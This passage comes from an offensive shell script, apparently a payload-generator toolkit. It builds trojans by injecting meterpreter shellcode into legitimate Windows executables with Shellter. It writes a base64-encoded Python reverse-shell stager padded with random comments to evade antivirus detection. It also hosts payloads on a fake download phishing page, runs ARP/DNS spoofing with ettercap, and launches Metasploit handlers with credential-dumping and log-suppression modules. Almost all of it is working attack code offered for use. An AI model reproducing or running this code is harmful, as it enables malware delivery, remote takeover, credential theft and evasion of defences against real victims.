        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files .."
sleep 2
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
# cleanup avet old files ..
rm $IPATH/obfuscate/avet/template.txt > /dev/null 2>&1
rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





#
# Shellter dynamic PE injector by: kyREcon
#
# HINT: accepts only legit executables and backdoor them with shellcode ..
# https://nodistribute.com/result/3UgXTM2Jp9 (0/39)
# https://www.virustotal.com/en/file/efe674192c87df5abce19b4ef7fa0005b7597a3de70d4ca1b34658f949d3df3e/analysis/1498501144/ (1/61)
#
sh_shellcode25 () {
# run module or abort ? 
QuE=$(zenity --question --title="☠ Shellter - dynamic PE injector ☠" --text "Author: @kyREcon\nThis module uses Shellter in order to inject shellcode into native Windows applications building trojan horses. (code cave injection)\n\nRun shellter module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

#
# checking for wine install ..
#
vinho=`which wine`
if [ "$?" -eq "0" ]; then
  echo "[✔] wine installation found .."
  sleep 2
else
  echo "[x] wine installation NOT FOUND .."
  sleep 2
  sudo apt-get install wine
fi

#
# checking if shellter its installed ..
#
if [ -e "$IPATH/obfuscate/shellter/shellter.exe" ]; then
  echo "[✔] shellter installation found .."
  sleep 2
else
  echo "[x] shellter installation NOT FOUND .."
  sleep 2
fi

  #
  # config settings needed by shellter ..
  #
    echo "[☠] Enter shellcode settings!"
    cd $IPATH/obfuscate/shellter
    LhOst=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
    LpOrt=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
    appl=$(zenity --title "☠ Shellter - Chose file to be backdoored ☠" --filename=$IPATH/ --file-selection) > /dev/null 2>&1
    paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "meterpreter_reverse_tcp" FALSE "meterpreter_reverse_http" FALSE "meterpreter_reverse_https" --width 350 --height 230) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$LhOst" ]; then LhOst="$IP";fi
if [ -z "$LpOrt" ]; then LpOrt="443";fi
if [ -z "$appl" ]; then echo "${RedF}[x]${white} This Module Requires one binary.exe input";sleep 3; sh_exit;fi

   #
   # grab only the executable name from the full path
   # ^/ (search for expression) +$ (print only last espression)
   #
   echo "$appl" > test.txt
   N4m=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1
   rm test.txt > /dev/null 2>&1


    #
    # copy files generated to output folder ..
    #
    cp $appl $IPATH/obfuscate/shellter
    chown $user $N4m > /dev/null 2>&1
    echo "[✔] Files Successfully copy to shellter .."
    sleep 2


# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $LpOrt
    | LHOST   : $LhOst
    | PAYLOAD : $paylo
    |_AGENT   : $IPATH/output/$N4m

!

  #
  # in ubuntu distros we can not run shellter.exe in wine with root privs
  # so we need to run it in the context of a normal user...
  #
  su $user -c "$arch shellter.exe -a -f $N4m --stealth -p $paylo --lhost $LhOst --port $LpOrt"
  echo ""
    #
    # clean recent files ..
    #
    rm *.bak > /dev/null 2>&1
    mv $N4m $IPATH/output > /dev/null 2>&1
    #
    # config correct payload arch  ..
    #
      if [ "$paylo" = "meterpreter_reverse_tcp" ]; then
        msf_paylo="windows/meterpreter/reverse_tcp"
      elif [ "$paylo" = "meterpreter_reverse_http" ]; then
        msf_paylo="windows/meterpreter/reverse_http"
      elif [ "$paylo" = "meterpreter_reverse_https" ]; then
        msf_paylo="windows/meterpreter/reverse_https"
      else
        echo ${RedF}[x]${white} Abort module execution ..${Reset};
        sleep 2
        sh_menu
      fi

#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1

  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$LhOst"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
    fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files .."
sleep 2
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
cd output
rm *.ini
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}






# ------------------------------
# PYTHON - UUID+BASE64 encoding
# ------------------------------
sh_shellcode26 () {
# run module or abort ? 
QuE=$(zenity --question --title="☠ UUID random keys evasion ☠" --text "Author: r00t-3xp10it | nullbyte\nAdding ramdom comments into sourcecode\nwill help evading AVs signature detection (@nullbite)\n'a computer can never outsmart a always changing virus'\n\nRun uuid module?" --width 370) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: UuidPayload" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="UuidPayload";fi

echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
sleep 2
echo "[☠] Building shellcode -> PYTHON format .."
sleep 2
# display final settings to user
cat << !


    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PYTHON -> MULTI OS
    |_PAYLOAD : python/meterpreter/reverse_tcp


!


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files .."
sleep 2


#
# Template ramdom keys ..
# HINT: adding ramdom comments to source code
# will help evading AVs signature detection (nullbite) 
# "a computer can never outsmart a always changing virus" 
#
NEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)


#
# Build python Template (random UUID keys)
#
cd $IPATH/output
echo "[✔] Using random UUID keys (evade signature detection)"
sleep 2
echo ""
echo "    Generated key:$NEW_UUID_1"
sleep 1
echo "    Generated key:$NEW_UUID_2"
sleep 1
echo "    Generated key:$NEW_UUID_3"
sleep 1
echo "    Generated key:$NEW_UUID_4"
sleep 1
echo "    Generated key:$NEW_UUID_5"
sleep 1
echo "    Generated key:$NEW_UUID_6"
echo ""
sleep 1


echo "[☠] build routine (template.raw) .."
sleep 2
echo "import socket,struct,time" > routine
echo "# $NEW_UUID_1" >> routine
echo "for x in range(10):" >> routine
echo "# $NEW_UUID_2" >> routine
echo "	try:" >> routine
echo "# $NEW_UUID_3" >> routine
echo "		s=socket.socket(2,socket.SOCK_STREAM)" >> routine
echo "# $NEW_UUID_4" >> routine
echo "		s.connect(('$lhost',$lport))" >> routine
echo "# $NEW_UUID_5" >> routine
echo "		break" >> routine
echo "# $NEW_UUID_6" >> routine
echo "	except:" >> routine
echo "# $NEW_UUID_1" >> routine
echo "		time.sleep(5)" >> routine
echo "# $NEW_UUID_2" >> routine
echo "l=struct.unpack('>I',s.recv(4))[0]" >> routine
echo "# $NEW_UUID_3" >> routine
echo "d=s.recv(l)" >> routine
echo "# $NEW_UUID_4" >> routine
echo "while len(d)<l:" >> routine
echo "# $NEW_UUID_5" >> routine
echo "	d+=s.recv(l-len(d))" >> routine
echo "# $NEW_UUID_6" >> routine
echo "exec(d,{'s':s})" >> routine



#
# base64 routine encoding
#
echo "[☠] base64 routine encoding .."
sleep 2
enc=`cat routine`
store=`echo "$enc" | base64 | tr -d '\n'`



#
# build template.py (final agent)
#
echo "[☠] build base64 $N4m.py agent .."
sleep 2
echo "# python  template | Author: r00t-3xp10it" > $IPATH/output/template.py
echo "# UUID obfuscation by: nullbyte" >> $IPATH/output/template.py
echo "# execute: python $N4m.py" >> $IPATH/output/template.py
echo "# ---" >> $IPATH/output/template.py
echo "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('$store')))" >> $IPATH/output/template.py



#
# make the file 'executable' ..
#
echo "[☠] make the file 'executable' .."
sleep 2
mv template.py $N4m.py > /dev/null 2>&1
chmod +x $N4m.py > /dev/null 2>&1



#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" --width 305 --height 360) > /dev/null 2>&1



  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi

  elif [ "$P0" = "dump_credentials_linux.rc" ]; then
    if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
      echo "[✔] wifi_dump_linux.rb -> found"
      sleep 2
    else
      echo "[x] wifi_dump_linux.rb -> not found"
      sleep 1
      echo "    copy post-module to msfdb .."
      cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

  else
    :
  fi

if [ "$P0" = "linux_hostrecon.rc" ]; then
  if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
    echo "[✔] linux_hostrecon.rb -> found"
    sleep 2
  else
    echo "[x] linux_hostrecon.rb -> not found"
    sleep 1
    echo "[*] copy post-module to msfdb .."
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.py|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm $ApAcHe/$N4m.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
rm $IPATH/output/routine > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_multi_menu
  clear
fi
}




# ---------------------------------------------------
# astrobaby word macro trojan payload (windows.c) OR
# exploit/multi/fileformat/office_word_macro (python)
# ---------------------------------------------------
sh_world23 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: astrobaby" --width 300) > /dev/null 2>&1
Targ=$(zenity --list --title "☠ CHOSE TARGET SYSTEM ☠" --text "chose target system .." --radiolist --column "Pick" --column "Option" TRUE "WINDOWS" FALSE "MAC OS x" --width 305 --height 100) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="astrobaby";fi
if [ -z "$Targ" ]; then Targ="WINDOWS";fi
